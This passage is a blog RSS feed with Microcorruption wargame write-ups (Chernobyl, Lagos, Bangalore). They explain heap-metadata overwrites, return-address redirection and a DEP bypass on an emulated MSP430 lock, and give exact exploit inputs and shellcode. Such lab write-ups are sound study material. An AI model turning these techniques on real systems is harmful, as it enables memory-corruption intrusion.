    &lt;span class=&quot;n&quot;&gt;val&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;val&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[::&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;su&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;val&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)):&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;su&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;val&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1f&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;su&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x8&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;readStrs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;val&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;val&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%.2&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;x&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;end&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;strs&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)])&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{}&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;pos&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;itertools&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;product&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;repeat&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;STR_LENGTH&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pos&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;val&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hashVal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;val&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;val&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;val&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;which-bin&quot;&gt;Which bin?&lt;/h3&gt;

&lt;p&gt;It is natural to wonder which bin header our sixth input should overwrite. Careful inspection of &lt;code class=&quot;highlighter-rouge&quot;&gt;free&lt;/code&gt; reveals that if the previous block has the &lt;code class=&quot;highlighter-rouge&quot;&gt;IN_USE&lt;/code&gt; turned off, &lt;code class=&quot;highlighter-rouge&quot;&gt;.prev&lt;/code&gt; of the block pointed by &lt;code class=&quot;highlighter-rouge&quot;&gt;.next&lt;/code&gt; will be overwritten. This may overwrite the carefully crafted header we created if the block at addr &lt;code class=&quot;highlighter-rouge&quot;&gt;.next&lt;/code&gt; is the block with the overwritten header. This is guaranteed to happen in every block after the first, as &lt;code class=&quot;highlighter-rouge&quot;&gt;free&lt;/code&gt; occurs from bin 0 to the last bin, clearing &lt;code class=&quot;highlighter-rouge&quot;&gt;IN_USE&lt;/code&gt; sequentially. To prevent this, we have to overwrite the header of bin 1, as &lt;code class=&quot;highlighter-rouge&quot;&gt;.prev&lt;/code&gt; of bin 0 pointed to the hash table metadata, which will definitely be in use. To overwrite the header in bin 1, the first 6 inputs must be placed in bin 0.&lt;/p&gt;

&lt;h3 id=&quot;how-to-overwrite-at-the-desired-location&quot;&gt;How to overwrite at the desired location?&lt;/h3&gt;

&lt;p&gt;Many restrictions apply when overwriting the header due to checks in the program. Most of the checks are performed by &lt;code class=&quot;highlighter-rouge&quot;&gt;malloc&lt;/code&gt;, which has strict rules on the value stored in &lt;code class=&quot;highlighter-rouge&quot;&gt;.next&lt;/code&gt;. The simple (one I initially tried) solution utilises the 11th input to overwrite a second header for the block. The first overwrite changes the &lt;code class=&quot;highlighter-rouge&quot;&gt;.next&lt;/code&gt; of the header to point it towards the third block downstream. This hides the second block downstream from &lt;code class=&quot;highlighter-rouge&quot;&gt;malloc&lt;/code&gt;, bypassing its checks. The &lt;code class=&quot;highlighter-rouge&quot;&gt;.prev&lt;/code&gt; of the second block is set to a return pointer location on the stack, &lt;code class=&quot;highlighter-rouge&quot;&gt;.next&lt;/code&gt; to a custom shell code location. With this, we can successfully unlock the door. However, this requires a high input length due to the custom shell code and extra padding size required for the second input, so I attempted to find an exploit that only requires one overwritten the header.&lt;/p&gt;

&lt;p&gt;When overwriting the header, the location we want to overwrite is stored in either &lt;code class=&quot;highlighter-rouge&quot;&gt;.prev&lt;/code&gt; or &lt;code class=&quot;highlighter-rouge&quot;&gt;.next&lt;/code&gt;. Storing it in &lt;code class=&quot;highlighter-rouge&quot;&gt;.prev&lt;/code&gt; requires the 2 byte value at 0x4(&lt;code class=&quot;highlighter-rouge&quot;&gt;.prev&lt;/code&gt;) to be even (not &lt;code class=&quot;highlighter-rouge&quot;&gt;IN_USE&lt;/code&gt;) to trigger the required &lt;code class=&quot;highlighter-rouge&quot;&gt;if&lt;/code&gt; statement correctly. Storing it in &lt;code class=&quot;highlighter-rouge&quot;&gt;.next&lt;/code&gt; means the address must be larger than the current address, or &lt;code class=&quot;highlighter-rouge&quot;&gt;malloc&lt;/code&gt; will crash the program. As the address we need to overwrite is often the program code or a value in the stack, the latter case is highly unlikely, suggesting &lt;code class=&quot;highlighter-rouge&quot;&gt;.prev&lt;/code&gt; must hold the address we want to overwrite.&lt;/p&gt;

&lt;h2 id=&quot;what-to-overwrite&quot;&gt;What to overwrite?&lt;/h2&gt;

&lt;p&gt;As &lt;code class=&quot;highlighter-rouge&quot;&gt;.prev&lt;/code&gt; will be used to store the address, the first &lt;code class=&quot;highlighter-rouge&quot;&gt;if&lt;/code&gt; statement in &lt;code class=&quot;highlighter-rouge&quot;&gt;free&lt;/code&gt; will be triggered. Thus, the value we want write will be stored at &lt;code class=&quot;highlighter-rouge&quot;&gt;.next&lt;/code&gt;, which must follow the &lt;code class=&quot;highlighter-rouge&quot;&gt;malloc&lt;/code&gt; rules: &lt;code class=&quot;highlighter-rouge&quot;&gt;.next&lt;/code&gt; must be after current block address. The value must also point to a address with a valid block header with sufficient size for &lt;code class=&quot;highlighter-rouge&quot;&gt;malloc&lt;/code&gt; to use or a &lt;code class=&quot;highlighter-rouge&quot;&gt;.next&lt;/code&gt; that points to a valid chain. This limits the possible values to be approximately  between 0x5000 and 0x5300 (the range our input will be stored at and the range of available block headers).&lt;/p&gt;

&lt;p&gt;Our selected value can overwrite one of two things: a return address on the stack or a part of program code. Unfortunately, the former method is not possible. None of the functions call &lt;code class=&quot;highlighter-rouge&quot;&gt;INT&lt;/code&gt; with 0x7f, preventing us from directly opening the door. In addition, the first &lt;code class=&quot;highlighter-rouge&quot;&gt;if&lt;/code&gt; statement in &lt;code class=&quot;highlighter-rouge&quot;&gt;free&lt;/code&gt; also copies the &lt;code class=&quot;highlighter-rouge&quot;&gt;.prev&lt;/code&gt; of the current block and replaces the &lt;code class=&quot;highlighter-rouge&quot;&gt;.prev&lt;/code&gt; of the block pointed by &lt;code class=&quot;highlighter-rouge&quot;&gt;.next&lt;/code&gt;. The stack is also placed between 0x3dd0 and 0x3dff, of which the ‘3d’ prefix refers to a jump statement, changing the program counter (pc) by a large fixed amount. Thus, if we do use the first method, the return address on the stack will be replaced, the pc will jump to the value we refer to, which has the first 2 bytes replaced by a value between the range 0x3dd0 and 0x3dff, causing the pc to jump again, missing our custom shellcode.&lt;/p&gt;

&lt;p&gt;Therefore, only the latter method is possible: we must overwrite a part of the program code. Through many trial-and-error attempts and careful observations of the program, I found a potential target in the program: the instruction “add #0x600, sp” at 4cc8. This instruction moves the stack pointer by 0x600, which moves it from the start of the input buffer to the end. By overwriting this instruction, we can prevent movement of the stack pointer, and with a special input, we can direct the return pointer to a arbitrary location (this time without any checks on the input as it is still in buffer).&lt;/p&gt;

&lt;p&gt;I planned to direct the return pointer to the &lt;code class=&quot;highlighter-rouge&quot;&gt;INT&lt;/code&gt;. With the control of the stack, we can provide the function with any argument we want. For &lt;code class=&quot;highlighter-rouge&quot;&gt;INT&lt;/code&gt;, an argument of 0x7f opens the lock automatically. The argument is placed 2 bytes behind the return address due to the implementation in the program, so a 2 byte padding is required.&lt;/p&gt;

&lt;p&gt;Unfortunately, the instruction at 4cc8 is only reached when an invalid command is entered (not starting with ‘a’ or ‘n’), so a 12th input is required to trigger that section of code. Due to the &lt;code class=&quot;highlighter-rouge&quot;&gt;pop&lt;/code&gt; instructions before the &lt;code class=&quot;highlighter-rouge&quot;&gt;ret&lt;/code&gt;, the stack pointer will move further downstream from the start of the input buffer. This requires some extra padding in the input buffer.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/pic3.png&quot; alt=&quot;Instructions near 4cc8&quot; /&gt;
&lt;em&gt;Figure showing instructions near 4cc8&lt;/em&gt;&lt;/p&gt;

&lt;h2 id=&quot;the-solution&quot;&gt;The solution&lt;/h2&gt;

&lt;p&gt;The solution requires 12 consecutive commands that each contain a username allocated to bin 0:&lt;/p&gt;

&lt;p&gt;5 dummy commands
1 command with the form &amp;lt;–8 byte “new “–&amp;gt;&amp;lt;–2 byte ‘.prev’–&amp;gt;&amp;lt;–2 byte ‘.next’–&amp;gt;&amp;lt;–2 byte size–&amp;gt;&amp;lt;–2 byte “ “ + pin–&amp;gt;
5 dummy commands
1 dummy command that can belong to any bin
1 invalid command that has the form &amp;lt;–padding–&amp;gt;&amp;lt;–2 byte address of &lt;code class=&quot;highlighter-rouge&quot;&gt;INT&lt;/code&gt;–&amp;gt;&amp;lt;–2 byte padding–&amp;gt;&amp;lt;–7f–&amp;gt;&lt;/p&gt;

&lt;p&gt;The dummy commands have the form &amp;lt;–8 byte “new “–&amp;gt;&amp;lt;–1 byte usrname–&amp;gt;&amp;lt;–2 byte “ “ + pin–&amp;gt;&lt;/p&gt;

&lt;p&gt;The following inputs (separated by line) requires 95 bytes of input, and they successfully unlock the door:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;6e657720082041
6e657720182041
6e657720682041
6e657720282041
6e657720302041
6e657720c64cfc50f5f32041
6e657720382041
6e657720402041
6e657720482041
6e657720502041
6e657720582041
6e657720602041
aaaaaaaaaaaaaaaaec4caaaa7f
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;decreasing-the-length&quot;&gt;Decreasing the length&lt;/h3&gt;

&lt;p&gt;The solution above, however, is not the optimal solution. Experimentation with the pins reveals 0x0 is a valid pin. As the pins play no significant role (from what I found), their values do not matter. One may also remember the input is preprocessed by the program, replacing all 0x20 bytes with 0x0. The above two factors imply the command “6e657720082041” play an equivalent role as “6e657720082000”, which is equivalent to “6e657720080000”. As the input buffer is guaranteed to be filled with 0x0 (it is cleared after each input), the last 2 bytes of the command may be omitted.&lt;/p&gt;

&lt;p&gt;Further optimisation can be performed by omitting all bytes after the initial ‘6e’. As the program confirms the command by the initial character instead of the entire string, omitting the remaining values tricks the program into thinking a username of 0x0 was entered. Furthermore, a username of 0x0 conveniently has a hash that allocates it to bin 0, allowing it to be used. However, as duplicate usernames are not allowed, this command can only be used once.&lt;/p&gt;

&lt;p&gt;Concatenation of the last 2 commands can be performed as the length of the padding exceeds the length of the command. The commands are separated with ‘;’. As the size of the previous command and ‘;’ is the same as the padding, no further padding is required.&lt;/p&gt;

&lt;p&gt;This allows the following inputs, which unlocks the door:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;6e
6e65772018
6e65772008
6e65772028
6e65772030
6e657720c64cfc50f5f3
6e65772038
6e65772040
6e65772048
6e65772050
6e65772058
6e6577206020413bec4caaaa7f
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The ‘.next’ in the 6th command was not randomly chosen. The instruction with value 0x50fc requires 2 arguments, allowing it to include one of the &lt;code class=&quot;highlighter-rouge&quot;&gt;push&lt;/code&gt; instructions as its argument, thus shortening the padding required by 2 bytes.&lt;/p&gt;

&lt;p&gt;Even though this post is already very long, a lot of details are still not covered properly, such as alternative places to overwrite. I experimented with many of these, but they failed to unlock the door due to the many restrictions imposed on the input. Looking at the hall of fame, the minimum input required is only 60 bytes! If anyone is willing to share the answer, please let me know; I have wasted too much time trying to shorten the solution.&lt;/p&gt;

</description>
        <pubDate>Fri, 22 Feb 2019 00:52:34 +1100</pubDate>
        <link>zijunh.github.io/2019/02/chernobyl/</link>
        <guid isPermaLink="true">zijunh.github.io/2019/02/chernobyl/</guid>
        
        <category>microcorruption</category>
        
        <category>solution</category>
        
        <category>wargame</category>
        
        
        <category>microcorruption</category>
        
      </item>
    
      <item>
        <title>Microcorruption - Lagos: Write-up</title>
        <description>&lt;h2 id=&quot;the-input&quot;&gt;The input&lt;/h2&gt;

&lt;p&gt;Only one string, the &lt;code class=&quot;highlighter-rouge&quot;&gt;password&lt;/code&gt; is entered, with a maximum input length of 0x200 bytes. One constraint is that only alphanumeric characters are allowed.&lt;/p&gt;

&lt;h2 id=&quot;the-exploit&quot;&gt;The exploit&lt;/h2&gt;

&lt;p&gt;When a constraint is applied, I always check if they are implemented properly. The alphanumeric checks are performed in the login function. The characters are first checked if they are between ‘0’-‘9’ (0x30-0x39) by adding 0xffd0 to the number. Effectively, this subtracts 0x30 from the number. The character is only copied if the difference is smaller or equal to 0x9, as seen in the &lt;code class=&quot;highlighter-rouge&quot;&gt;jc&lt;/code&gt; instruction. A similar process is performed for both sets of alphabets ‘a’-‘z’ and ‘A’-‘Z’. There are no potential exploits in this area of code.&lt;/p&gt;

&lt;p&gt;On the other hand, one potential method of exploitation is overwriting the stack and even some code. With 0x200 bytes of input, we can overwrite the stack at 0x13, and then &lt;code class=&quot;highlighter-rouge&quot;&gt;conditional_unlock_door&lt;/code&gt; at 0x91. Overwriting the stack allowing direction of the return pointer, but the available address are limited due to the alphanumeric restriction. Overwriting the function allows execution of arbitary code, but the instructions must have a alphanumeric hex value. After some googling, I found a &lt;a href=&quot;https://gist.github.com/rmmh/8515577&quot;&gt;list of alphanumeric instructions for MSP430&lt;/a&gt;. Looking at the instructions, they do not seem particularly useful, though it should be possible to create a string of instructions that manipulates &lt;code class=&quot;highlighter-rouge&quot;&gt;pc&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;sr&lt;/code&gt; to achieve the desired outcome given the large input size. I did not chose to go down this route, as appears to be quite complicated and boring to derived the required instructions.&lt;/p&gt;

&lt;p&gt;The remaining method is overwriting the stack. Initially I attempted some &lt;a href=&quot;https://en.wikipedia.org/wiki/Return-oriented_programming&quot;&gt;rop&lt;/a&gt; exploits, but there weren’t enough gadgets and the useful ones were not accessible due to the addresses not complying to the restrictions. However, during this exploratory process, I discovered that the input prompt, &lt;code class=&quot;highlighter-rouge&quot;&gt;getsn&lt;/code&gt;, resides within the available memory address. &lt;code class=&quot;highlighter-rouge&quot;&gt;getsn&lt;/code&gt; has 2 parameters, the size and storage location of the input. The 2 parameters are pushed onto the stack with the interrupt code 0x2 and &lt;code class=&quot;highlighter-rouge&quot;&gt;INT&lt;/code&gt; called. As we have full control of the stack, we can manipulate the parameters and change the storage location to be directly after the &lt;code class=&quot;highlighter-rouge&quot;&gt;INT&lt;/code&gt; call. This time, no restrictions apply as the check is not performed, allowing arbitary code execution.&lt;/p&gt;

&lt;p&gt;The code we plan to execute is the classic 8 byte ‘324000ffb0121000’ derived from the following instructions:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mov 	#0xff00, sr
call	#0x10
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The required &lt;code class=&quot;highlighter-rouge&quot;&gt;getsn&lt;/code&gt; code starts at 0x4654, as we need to push 0x2 onto the stack. The storage address of the input will be 0x465a, directly after the &lt;code class=&quot;highlighter-rouge&quot;&gt;INT&lt;/code&gt; call. Though the size parameter of &lt;code class=&quot;highlighter-rouge&quot;&gt;getsn&lt;/code&gt; is required, we can omit it and use the value on the stack. At this point of execution, the value is larger than 8 bytes, so all our payload will be included.&lt;/p&gt;

&lt;h2 id=&quot;the-solution&quot;&gt;The solution&lt;/h2&gt;

&lt;p&gt;The first input has the following form:&lt;/p&gt;

&lt;p&gt;&amp;lt;–0x11 byte padding–&amp;gt;
&amp;lt;–2 byte &lt;code class=&quot;highlighter-rouge&quot;&gt;getsn&lt;/code&gt; address–&amp;gt;
&amp;lt;–2 byte storage address–&amp;gt;&lt;/p&gt;

&lt;p&gt;and the following value:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;aaaaaaaaaaaaaaaaaTFZF
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The second input is simply the following:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;324000ffb0121000
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
</description>
        <pubDate>Tue, 19 Feb 2019 13:52:34 +1100</pubDate>
        <link>zijunh.github.io/2019/02/lagos/</link>
        <guid isPermaLink="true">zijunh.github.io/2019/02/lagos/</guid>
        
        <category>microcorruption</category>
        
        <category>solution</category>
        
        <category>wargames</category>
        
        
        <category>microcorruption</category>
        
      </item>
    
      <item>
        <title>Microcorruption - Bangalore: Write-up</title>
        <description>&lt;h2 id=&quot;the-input&quot;&gt;The input&lt;/h2&gt;

&lt;p&gt;For this particular problem, the user can enter one string, &lt;code class=&quot;highlighter-rouge&quot;&gt;password&lt;/code&gt;, with a maximum length of 0x30 bytes.&lt;/p&gt;

&lt;h2 id=&quot;the-exploit&quot;&gt;The exploit&lt;/h2&gt;

&lt;p&gt;Looking at the function names again, we see something like &lt;code class=&quot;highlighter-rouge&quot;&gt;make_page_executable&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;make_page_writable&lt;/code&gt;. This immediately reminds us of DEP, data execution prevention. Typically, it is a system-level feature that prevents execution of certain areas of code. We consult the &lt;a href=&quot;https://microcorruption.com/manual.pdf&quot;&gt;lock manual&lt;/a&gt; for more information on this feature.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;INT 0x10.&lt;br /&gt;
Turn on DEP: pages are either executable or writable but never both.&lt;br /&gt;
Takes no arguments.&lt;/p&gt;

  &lt;p&gt;INT 0x11.&lt;br /&gt;
Mark as a page as either only executable or only writable.&lt;br /&gt;
Takes two one arguments. The first argument is the page number, the second argument is 1 if writable, 0 if executable.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;As interrupts codes are moved to &lt;code class=&quot;highlighter-rouge&quot;&gt;sr&lt;/code&gt; and transformed by the commands &lt;code class=&quot;highlighter-rouge&quot;&gt;swpb&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;bis 0x8000&lt;/code&gt;, 0x10 corresponds to 0x9000 in `sr, and 0x11 to 0x9100. The open door interrupt 0x7f corresponds to (if you haven’t noticed already) 0xff00.&lt;/p&gt;

&lt;p&gt;Each page of memory contains 0x100 bytes, and the page number is first two digits of the memory address. Looking at &lt;code class=&quot;highlighter-rouge&quot;&gt;set_up_protection&lt;/code&gt;, we can see 0x0000 - 0x43ff are set to be write only, and 0x4400 - 0xffff are set to be execution only.&lt;/p&gt;

&lt;p&gt;The exploit begins with a simple stack overflow. The return address of &lt;code class=&quot;highlighter-rouge&quot;&gt;login&lt;/code&gt; is stored 0x10 bytes downstream of the beginning of the input. As 0x30 bytes are accepted, it can be easily overwritten. However, we cannot direct it to our own shellcode in the stack, as it is not executable due to DEP.&lt;/p&gt;

&lt;p&gt;But, the implemention of DEP is a mere annoyance, as it can be bypassed easily by calling INT 0x11 again with the appropriate arguments. This is done by referencing the appropriate parts of &lt;code class=&quot;highlighter-rouge&quot;&gt;mark_page_executable&lt;/code&gt;. We will provide the arguments ourselves, so the &lt;code class=&quot;highlighter-rouge&quot;&gt;pc&lt;/code&gt; will be directed to &lt;code class=&quot;highlighter-rouge&quot;&gt;44ba&lt;/code&gt;, after the &lt;code class=&quot;highlighter-rouge&quot;&gt;push&lt;/code&gt; instruction. Observe the input string on the stack starts on 0x3fee, so the page number will be 0x3f.&lt;/p&gt;

&lt;p&gt;In order to call &lt;code class=&quot;highlighter-rouge&quot;&gt;mark_page_executable&lt;/code&gt; properly, we need to provide 2 arguments: the page number (0x3f) and the “set writable” flag (0x0). Remember the arguments are pushed in reverse order, so 0x0 will be pushed first. After the arguments, we can set the return address of this call. It will be set to 0x3fee, the start of our payload.&lt;/p&gt;

&lt;p&gt;As mentioned before, the &lt;code class=&quot;highlighter-rouge&quot;&gt;sr&lt;/code&gt; value for open door is 0xff00. This value will be moved to the &lt;code class=&quot;highlighter-rouge&quot;&gt;sr&lt;/code&gt; register and &lt;code class=&quot;highlighter-rouge&quot;&gt;__trap_interrupt&lt;/code&gt; can be called. This is done with the following assembly code:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mov 	#0xff00, sr
call	#0x10
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This turns into 324000ffb0121000 for machine code. This should open the door successfully.&lt;/p&gt;

&lt;h2 id=&quot;the-solution&quot;&gt;The solution&lt;/h2&gt;

&lt;p&gt;The solution will have the following structure:&lt;/p&gt;

&lt;p&gt;&amp;lt;–8 byte machine code payload–&amp;gt;&lt;br /&gt;
&amp;lt;–8 byte padding–&amp;gt;&lt;br /&gt;
&amp;lt;–2 byte DEP unlock address–&amp;gt;&lt;br /&gt;
&amp;lt;–4 byte arguments–&amp;gt;&lt;br /&gt;
&amp;lt;–2 byte payload address–&amp;gt;&lt;/p&gt;

&lt;p&gt;and the following solution:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;324000ffb0121000aaaabbbbaaaabbbbba443f000000f03f
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
</description>
